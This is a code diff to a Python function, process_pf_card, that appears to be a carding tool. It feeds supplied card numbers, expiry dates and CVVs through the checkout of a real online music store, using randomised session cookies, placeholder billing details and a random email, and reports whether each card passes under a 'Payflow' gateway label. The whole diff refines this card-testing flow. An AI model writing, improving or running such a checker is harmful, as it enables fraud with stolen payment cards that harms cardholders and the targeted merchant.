@@ -66,18 +66,11 @@ def process_pf_card(cc):
             
             return "No specific message found"
 
-        # Common cookies and headers
-        cookies = {
-            "bid_48b113f42dc09a04ef102654144bd0f3": "84deb6a2a19a3574b34723efcf6bf817",
-            "PHPSESSID": "92os74jahvh61pani4ri6i7j76",
-            "cid_48b113f42dc09a04ef102654144bd0f3": "YoIFCQCEA2SASNgbAAka6w%3D%3D__5B0E6P48J8__6B5A2M8N5Z8E1B0N0C4N0Q4L0Q94G9",
-        }
-        
+        # Common headers
         headers = {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'Accept-Language': 'en-US,en;q=0.9',
             'Connection': 'keep-alive',
-            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/',
             'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
             'Sec-Fetch-Site': 'same-origin',
@@ -88,13 +81,104 @@ def process_pf_card(cc):
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
         }
+
+        # Create a session to maintain cookies
+        session = requests.Session()
         
-        # Generate random email
-        random_email = generate_random_email()
+        # Generate random session cookies
+        random_bid = ''.join(random.choices('abcdef0123456789', k=32))
+        random_sessid = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=26))
         
-        # Prepare POST data for checkout
+        # Set initial cookies
+        session.cookies.update({
+            'bid_48b113f42dc09a04ef102654144bd0f3': random_bid,
+            'PHPSESSID': random_sessid,
+        })
+
+        # Step 1: Add product to cart
+        quick_return_headers = headers.copy()
+        quick_return_headers.update({
+            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/',
+        })
+        
+        quick_return_response = session.get(
+            'https://stores.modularmarket.com/music_for_every_soul/quick_return.php?id=637&qty=1',
+            headers=quick_return_headers,
+            timeout=30
+        )
+        
+        if quick_return_response.status_code != 200:
+            return {
+                "status": "ERROR",
+                "response": f"Failed to add product to cart: HTTP {quick_return_response.status_code}",
+                "gateway": "Payflow [0.98$]"
+            }
+
+        # Step 2: Load product page
+        product_headers = headers.copy()
+        product_headers.update({
+            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/',
+        })
+        
+        product_response = session.get(
+            'https://stores.modularmarket.com/music_for_every_soul/product.php?retain_errors=Y&retain_notices=Y',
+            headers=product_headers,
+            timeout=30
+        )
+        
+        if product_response.status_code != 200:
+            return {
+                "status": "ERROR",
+                "response": f"Failed to load product page: HTTP {product_response.status_code}",
+                "gateway": "Payflow [0.98$]"
+            }
+
+        # Step 3: Go to checkout page
         checkout_headers = headers.copy()
         checkout_headers.update({
+            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/product.php?retain_errors=Y&retain_notices=Y',
+        })
+        
+        checkout_response = session.get(
+            'https://stores.modularmarket.com/music_for_every_soul/checkout/',
+            headers=checkout_headers,
+            timeout=30
+        )
+        
+        if checkout_response.status_code != 200:
+            return {
+                "status": "ERROR",
+                "response": f"Failed to load checkout page: HTTP {checkout_response.status_code}",
+                "gateway": "Payflow [0.98$]"
+            }
+
+        # Step 4: Load checkout.php
+        checkout_php_headers = headers.copy()
+        checkout_php_headers.update({
+            'Referer': 'https://stores.modularmarket.com/music_for_every_soul/product.php?retain_errors=Y&retain_notices=Y',
+        })
+        
+        checkout_php_response = session.get(
+            'https://stores.modularmarket.com/music_for_every_soul/checkout.php',
+            headers=checkout_php_headers,
+            timeout=30
+        )
+        
+        if checkout_php_response.status_code != 200:
+            return {
+                "status": "ERROR",
+                "response": f"Failed to load checkout form: HTTP {checkout_php_response.status_code}",
+                "gateway": "Payflow [0.98$]"
+            }
+
+        # Generate random email and user details
+        random_email = generate_random_email()
+        first_name = 'John'
+        last_name = 'Doe'
+
+        # Prepare POST data for checkout
+        checkout_post_headers = headers.copy()
+        checkout_post_headers.update({
             'Cache-Control': 'max-age=0',
             'Content-Type': 'application/x-www-form-urlencoded',
             'Origin': 'https://stores.modularmarket.com',
@@ -102,24 +186,11 @@ def process_pf_card(cc):
         })
         
         data = {
-            # Shipping info
-            'ship_sai[289]': '289',
-            'ship_first_name[289]': 'John',
-            'ship_last_name[289]': 'Doe',
-            'ship_address_1[289]': '123 Main St',
-            'ship_address_2[289]': '',
-            'ship_city[289]': 'New York',
-            'ship_state[289]': 'NY_US',
-            'ship_zip[289]': '10001',
-            'ship_country[289]': 'US',
-            'submit_shipping_options[289_0o0_32]': '1756365496',
-            'ship_method_selection[289_0o0]': 'shipoption_289_0o0_32_6',
-            'submit_shipping_options[289_0o0_36]': '1756365496',
-            'prechecked_ship_methods': 'shipoption_289_0o0_32_6',
-
             # Billing info
-            'bill_first_name': 'John',
-            'bill_last_name': 'Doe',
+            'coupon_codes': '',
+            'reward_points': '',
+            'bill_first_name': first_name,
+            'bill_last_name': last_name,
             'bill_address_1': '123 Main St',
             'bill_address_2': '',
             'bill_city': 'New York',
@@ -129,23 +200,24 @@ def process_pf_card(cc):
             'phone': '5551234567',
             'email': random_email,
             'email_confirm': random_email,
+            'password': 'Password123',
+            'password_confirm': 'Password123',
 
             # Payment info
-            'slot_2': 'John Doe',
+            'slot_2': f'{first_name} {last_name}',
             'slot_1': card_number,
             'slot_3': mm,
             'slot_4': yy,
             'cc_security': cvv,
             'submit_pay_with_cc': 'Pay With Credit Card',
-            'submit_paypal_wps_capture_order_checksum': '555d6702c950ecb729a966504af0a635',
+            'submit_paypal_wps_capture_order_checksum': 'cb70ab375662576bd1ac5aaf16b3fca4',
             'nectar_decanter': '',
         }
         
-        # Make the POST request to checkout
-        response = requests.post(
+        # Make the final POST request to checkout.php
+        response = session.post(
             'https://stores.modularmarket.com/music_for_every_soul/checkout.php',
-            cookies=cookies,
-            headers=checkout_headers,
+            headers=checkout_post_headers,
             data=data,
             timeout=30
         )
@@ -217,5 +289,3 @@ def process_pf_card(cc):
             "status": "ERROR",
             "response": f"Processing error: {str(e)}",
             "gateway": "Payflow [0.98$]"
-        }
-
